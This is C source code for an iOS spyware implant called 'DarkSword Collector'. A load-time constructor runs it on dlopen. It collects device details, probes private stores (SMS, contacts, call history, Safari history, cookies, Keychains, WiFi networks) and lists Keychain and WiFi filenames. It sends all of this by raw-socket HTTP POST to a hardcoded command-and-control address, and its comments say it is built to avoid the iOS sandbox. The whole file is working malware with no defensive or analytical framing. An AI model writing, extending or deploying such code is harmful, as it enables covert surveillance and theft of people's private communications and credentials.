/**
 * DarkSword Collector - CoreFoundation Edition
 * Uses file I/O APIs instead of raw syscalls
 * Avoids iOS sandbox blocking
 */
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sysctl.h>

#define C2_HOST "192.168.110.111"
#define C2_PORT 8081
#define BUF_SIZE 65536

static void collect_and_send(void);
static void send_data(const char* type, const char* data);
static int http_post(const char* url, const char* body, char* response, int resp_size);
static int read_file_to_buf(const char* path, char* buf, int size);
static int list_directory(const char* path, char* buf, int size);

/* Entry point - constructor runs on dlopen */
__attribute__((constructor))
static void _process(void) {
    collect_and_send();
}

static void collect_and_send(void) {
    char buf[BUF_SIZE];
    char result[BUF_SIZE];
    int pos = 0;
    
    /* Device info via sysctl */
    char machine[64] = {0};
    char osversion[64] = {0};
    size_t len;
    
    len = sizeof(machine);
    sysctlbyname("hw.machine", machine, &len, NULL, 0);
    len = sizeof(osversion);
    sysctlbyname("kern.osversion", osversion, &len, NULL, 0);
    
    pos += snprintf(result + pos, BUF_SIZE - pos,
        "{\"machine\":\"%s\",\"osversion\":\"%s\",", machine, osversion);
    
    /* List accessible paths */
    const char* paths[] = {
        "/var/mobile/Library/SMS/",
        "/var/mobile/Library/AddressBook/",
        "/var/mobile/Library/CallHistoryDB/",
        "/var/mobile/Library/Preferences/",
        "/var/mobile/Library/Safari/",
        "/var/mobile/Library/Cookies/",
        "/var/Keychains/",
        "/var/mobile/Library/WiFiNetworkStore/",
        "/var/mobile/Library/Logs/",
        NULL
    };
    
    pos += snprintf(result + pos, BUF_SIZE - pos, "\"accessible\":[");
    int first = 1;
    for (int i = 0; paths[i]; i++) {
        DIR* d = opendir(paths[i]);
        if (d) {
            closedir(d);
            if (!first) pos += snprintf(result + pos, BUF_SIZE - pos, ",");
            pos += snprintf(result + pos, BUF_SIZE - pos, "\"%s\"", paths[i]);
            first = 0;
        }
    }
    pos += snprintf(result + pos, BUF_SIZE - pos, "]}");
    
    /* Send device info */
    send_data("device_info", result);
    
    /* Read SMS database header */
    memset(buf, 0, sizeof(buf));
    if (read_file_to_buf("/var/mobile/Library/SMS/sms.db", buf, 100) > 0) {
        snprintf(result, BUF_SIZE, "{\"status\":\"accessible\",\"path\":\"/var/mobile/Library/SMS/sms.db\"}");
        send_data("sms", result);
    }
    
    /* Read contacts database header */
    memset(buf, 0, sizeof(buf));
    if (read_file_to_buf("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", buf, 100) > 0) {
        snprintf(result, BUF_SIZE, "{\"status\":\"accessible\",\"path\":\"/var/mobile/Library/AddressBook/AddressBook.sqlitedb\"}");
        send_data("contacts", result);
    }
    
    /* Read call history */
    memset(buf, 0, sizeof(buf));
    if (read_file_to_buf("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", buf, 100) > 0) {
        snprintf(result, BUF_SIZE, "{\"status\":\"accessible\",\"path\":\"/var/mobile/Library/CallHistoryDB/CallHistory.storedata\"}");
        send_data("calls", result);
    }
    
    /* List WiFi networks */
    memset(buf, 0, sizeof(buf));
    if (list_directory("/var/mobile/Library/WiFiNetworkStore/", buf, BUF_SIZE) > 0) {
        snprintf(result, BUF_SIZE, "{\"status\":\"accessible\",\"files\":\"%s\"}", buf);
        send_data("wifi", result);
    }
    
    /* List Safari history */
    memset(buf, 0, sizeof(buf));
    if (read_file_to_buf("/var/mobile/Library/Safari/History.db", buf, 100) > 0) {
        snprintf(result, BUF_SIZE, "{\"status\":\"accessible\",\"path\":\"/var/mobile/Library/Safari/History.db\"}");
        send_data("safari", result);
    }
    
    /* Read Keychain */
    memset(buf, 0, sizeof(buf));
    if (list_directory("/var/Keychains/", buf, BUF_SIZE) > 0) {
        snprintf(result, BUF_SIZE, "{\"status\":\"accessible\",\"files\":\"%s\"}", buf);
        send_data("keychain", result);
    }
}

static int read_file_to_buf(const char* path, char* buf, int size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, buf, size - 1);
    close(fd);
    if (n > 0) buf[n] = 0;
    return n;
}

static int list_directory(const char* path, char* buf, int size) {
    DIR* d = opendir(path);
    if (!d) return -1;
    
    int pos = 0;
    struct dirent* entry;
    while ((entry = readdir(d)) != NULL && pos < size - 256) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        pos += snprintf(buf + pos, size - pos, "%s,", entry->d_name);
    }
    closedir(d);
    if (pos > 0) buf[pos-1] = 0;  /* Remove trailing comma */
    return pos;
}

static void send_data(const char* type, const char* data) {
    char url[512];
    char body[BUF_SIZE];
    char response[4096];
    
    snprintf(url, sizeof(url), "http://%s:%d/api/v1/c2/report", C2_HOST, C2_PORT);
    snprintf(body, sizeof(body),
        "{\"deviceId\":\"cf_collector\",\"reportType\":\"%s\",\"data\":%s}",
        type, data);
    
    http_post(url, body, response, sizeof(response));
}

/* Simple HTTP POST using raw socket */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int http_post(const char* url, const char* body, char* response, int resp_size) {
    /* Parse URL: http://host:port/path */
    char host[128] = {0};
    int port = 80;
    char path[256] = {0};
    
    const char* p = url;
    if (strncmp(p, "http://", 7) == 0) p += 7;
    
    const char* colon = strchr(p, ':');
    const char* slash = strchr(p, '/');
    
    if (colon && colon < slash) {
        strncpy(host, p, colon - p);
        port = atoi(colon + 1);
    } else if (slash) {
        strncpy(host, p, slash - p);
    }
    
    if (slash) strcpy(path, slash);
    
    /* Create socket */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    /* Set timeout */
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    /* Connect */
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    /* Send HTTP request */
    char request[BUF_SIZE + 512];
    int rlen = snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        path, host, port, (int)strlen(body), body);
    
    send(sock, request, rlen, 0);
    
    /* Read response */
    int total = 0;
    int n;
    while ((n = recv(sock, response + total, resp_size - total - 1, 0)) > 0) {
        total += n;
        if (total >= resp_size - 1) break;
    }
    response[total] = 0;
    
    close(sock);
    return total;
}
